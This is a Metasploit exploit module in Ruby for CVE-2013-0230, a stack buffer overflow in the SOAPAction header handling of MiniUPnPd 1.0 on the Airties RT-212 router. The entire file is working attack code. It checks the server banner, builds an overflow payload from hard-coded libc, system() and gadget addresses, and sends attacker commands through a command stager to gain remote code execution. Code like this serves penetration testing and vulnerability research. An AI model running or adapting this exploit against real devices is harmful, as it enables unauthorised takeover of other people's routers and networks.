##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MiniUPnPd 1.0 Stack Buffer Overflow Remote Code Execution',
      'Description'    => %q{
          This module exploits the MiniUPnP 1.0 SOAP stack buffer overflow vulnerability
        present in the SOAPAction HTTP header handling.
      },
      'Author'         =>
        [
          'hdm', # Vulnerability discovery
          'Dejan Lukan', # orig Metasploit module
          'Onur ALANBEL', # exploit for Airties router
          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module for Airties router
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => ARCH_MIPSBE,
      'References'     =>
        [
          [ 'CVE', '2013-0230' ],
          [ 'OSVDB', '89624' ],
          [ 'BID', '57608' ],
          [ 'EDB', '36839' ],
          [ 'URL', 'https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play']
        ],
      'Targets'        =>
        [
          [ 'Airties RT-212 v1.2.0.23 / MiniUPnPd 1.0',
            {
              'Offset'     => 2048,
              'LibcBase'   => 0x2aabd000,
              'System'     => 0x00031AC0 ,
              'CallSystem' => 0x0001CC94   # prepare $a0 and jump to $s0
            }
          ],
        ],
      'DisclosureDate' => 'Mar 27 2013',
      'DefaultTarget'  => 0))
      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')

    register_options([
      Opt::RPORT(5555),
    ], self.class)
  end

  def check
    begin
      res = send_request_cgi({
      'method'	=> 'POST',
      'uri'		 => "/",
      })

      if res && res.headers['Server'] =~ /miniupnpd\/1.0/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("#{peer} - Accessing the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end

    #
    # Build and send the HTTP request
    #
    print_status("#{peer} - Sending exploit to victim #{target.name}")
    execute_cmdstager(
      :flavor  => :echo
    )
  end

  def execute_command(cmd, opts)
    # Build the SOAP Exploit
    # a valid action
    sploit = "n:schemas-upnp-org:service:WANIPConnection:1#"
    sploit << rand_text_alpha_upper(target['Offset'])
    sploit << [target['LibcBase'] + target['System']].pack("N")      # s0 - address of system
    sploit << rand_text_alpha_upper(24)                              # $s1 - $s6
    sploit << [target['LibcBase'] + target['CallSystem']].pack("N")

               # 0001CC94                 addiu   $a0, $sp, 0x18
               # 0001CC98                 move    $t9, $s0
               # 0001CC9C                 jalr    $t9
               # 0001CCA0                 li      $a1, 1

    sploit << rand_text_alpha_upper(24)                              #filler
    sploit << cmd

    # data sent in the POST body
    data =
      "<?xml version='1.0' encoding=\"UTF-8\"?>\r\n" +
      "<SOAP-ENV:Envelope\r\n" +
      "	SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n" +
      "	xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n" +
      "	xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n" +
      ">\r\n" +
      "<SOAP-ENV:Body>\r\n" +
      "<ns1:action xmlns:ns1=\"urn:schemas-upnp-org:service:WANIPConnection:1\" SOAP-ENC:root=\"1\">\r\n" +
      "</ns1:action>\r\n" +
      "</SOAP-ENV:Body>\r\n" +
      "</SOAP-ENV:Envelope>\r\n"

    send_request_cgi({
      'method'	=> 'POST',
      'uri'		 => "/",
      'headers' => {
        'SOAPAction' => sploit,
      },
      'data'		=> data,
    })
  end
end
